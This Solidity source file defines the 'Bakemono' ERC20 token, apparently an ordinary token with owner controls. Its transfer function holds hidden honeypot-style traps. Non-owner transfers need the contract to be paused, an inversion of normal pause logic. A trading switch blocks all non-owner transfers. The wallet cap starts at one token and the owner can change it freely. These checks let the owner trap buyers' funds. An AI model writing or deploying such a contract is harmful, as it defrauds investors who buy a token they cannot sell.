// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

import "./Ownable.sol";
import "./Pausable.sol";
import "./ERC20.sol";

contract Bakemono is Ownable, ERC20, Pausable {

    mapping(address => bool) private pair;
    bool public tradingOpen;
    uint256 public _maxWalletSize = 1 * 10 ** decimals();
    uint256 private _totalSupply = 1000000 * 10 ** decimals();

    constructor() ERC20("Bakemono", "MONO") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function addPair(address toPair) public onlyOwner {
        require(!pair[toPair], "This pair is already excluded");
        pair[toPair] = true;
    }

    function setTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }

    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWalletSize = maxWalletSize;
    }

    function removeLimits() public onlyOwner{
        _maxWalletSize = _totalSupply;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

       if(from != owner() && to != owner()) {
           require(paused(), "Denied");

            if (!tradingOpen) {
                require(from == owner(), "Trading not enabled");
            }

            if(from != owner() && to != owner() && pair[from]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Maximum token balance exceeded");
            }
            
            if(from != owner() && to != owner() && !(pair[to]) && !(pair[from])) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Maximum token balance exceeded");
            }

       }

       super._transfer(from, to, amount);

    }

}